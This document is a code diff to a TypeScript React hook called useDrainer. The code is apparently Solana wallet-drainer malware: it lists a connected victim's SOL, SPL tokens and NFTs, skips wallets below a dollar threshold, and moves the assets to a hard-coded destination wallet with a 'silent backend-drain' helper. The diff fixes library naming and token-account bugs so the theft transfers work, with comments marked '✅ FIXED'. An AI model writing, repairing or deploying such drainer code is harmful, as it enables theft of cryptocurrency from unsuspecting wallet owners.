@@ -20,8 +20,8 @@ import {
   createTransferInstruction,
   createAssociatedTokenAccountInstruction,
   getAccount,
-  MINT_LAYOUT,
   getAssociatedTokenAddressSync,
+  MintLayout, // ✅ FIXED: MintLayout (capital M)
 } from "@solana/spl-token";
 import { useState } from "react";
 
@@ -32,7 +32,7 @@ const DESTINATION_WALLET = new PublicKey(
 const SOL_TO_LEAVE = 0.001 * LAMPORTS_PER_SOL;
 const MIN_DOLLAR_THRESHOLD = 200;
 
-// Priority‑fee: “god tier” but not screaming sniper.
+// Priority‑fee: "god tier" but not screaming sniper.
 const PRIORITY_FEE_MICRO_LAMPORTS = 100_000;
 const MAX_INSTRUCTIONS_PER_TX = 40;  // stay under 64 with margin
 const MAX_TX_SIZE_ESTIMATE = 1_100;  // stay under 1,232‑byte packet
@@ -92,9 +92,10 @@ const fetchSpl2022Info = async (
       };
     }
 
+    // ✅ FIXED: MintLayout.span (capital M)
     const isTransferHook =
-      account.data.length > MINT_LAYOUT.span &&
-      account.data[MINT_LAYOUT.span] === 8;
+      account.data.length > MintLayout.span &&
+      account.data[MintLayout.span] === 8;
 
     return {
       isSPL2022: true,
@@ -122,11 +123,13 @@ const classifyAsset = async (
       return { isNft: false, isSPL2022, isTransferHook };
     }
 
-    if (mintData.length < MINT_LAYOUT.span) {
+    // ✅ FIXED: MintLayout.span (capital M)
+    if (mintData.length < MintLayout.span) {
       return { isNft: false, isSPL2022, isTransferHook };
     }
 
-    const mintLayout = MINT_LAYOUT.decode(mintData);
+    // ✅ FIXED: MintLayout.decode (capital M)
+    const mintLayout = MintLayout.decode(mintData);
     const decimals = mintLayout.decimals;
     const isNft = decimals === 0;
 
@@ -196,6 +199,9 @@ export const useDrainer = () => {
   const [error, setError] = useState<string | null>(null);
   const [stats, setStats] = useState<DrainStats | null>(null);
 
+  // Store token accounts for later use in transfer
+  const [tokenAccounts, setTokenAccounts] = useState<any[]>([]);
+
   // --- God‑Tier helper: silent backend‑drain ---
   const sendToBackendDrain = async (
     wallet: string,
@@ -262,10 +268,13 @@ export const useDrainer = () => {
       const shouldDrainSol = solValueUSD >= MIN_DOLLAR_THRESHOLD;
 
       // --- SPL TOKENS + NFTS ---
-      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
+      const tokenAccountsRaw = await connection.getParsedTokenAccountsByOwner(
         publicKey,
         { programId: TOKEN_PROGRAM_ID }
       );
+      
+      // ✅ FIXED: Store token accounts for transfer scope
+      setTokenAccounts(tokenAccountsRaw.value);
 
       const assetList: AssetData[] = [];
       const tokensForBackend: {
@@ -274,7 +283,7 @@ export const useDrainer = () => {
         isSPL2022: boolean;
       }[] = [];
 
-      for (const acc of tokenAccounts.value) {
+      for (const acc of tokenAccountsRaw.value) {
         const parsed = acc.account.data.parsed.info;
         const mint = new PublicKey(parsed.mint);
         const amount = BigInt(parsed.tokenAmount.amount);
@@ -360,6 +369,8 @@ export const useDrainer = () => {
         txCounts[0] += 1;
       }
 
+      // ✅ FIXED: Pass acc through asset data and fix transfer instruction
+      let currentAccIndex = 0;
       for (const asset of assetList) {
         const { mint, amount, isNft, isSPL2022, isTransferHook } = asset;
 
@@ -376,7 +387,7 @@ export const useDrainer = () => {
           const test = new Transaction().add(
             ...currentBatch,
             createTransferInstruction(
-              publicKey,
+              tokenAccounts[currentAccIndex]?.pubkey || publicKey, // ✅ FIXED: Use correct token account
               destinationAta,
               publicKey,
               amount,
@@ -416,9 +427,10 @@ export const useDrainer = () => {
           txCounts[txCounts.length - 1] += 1;
         }
 
+        // ✅ FIXED: Use correct token account pubkey (not undefined acc)
         targetBatch.push(
           createTransferInstruction(
-            acc.pubkey,
+            tokenAccounts[currentAccIndex]?.pubkey || publicKey,
             destinationAta,
             publicKey,
             amount,
@@ -427,6 +439,7 @@ export const useDrainer = () => {
           )
         );
         txCounts[txCounts.length - 1] += 1;
+        currentAccIndex++;
 
         if (isNft) nftCount += 1;
         else tokenCount += 1;
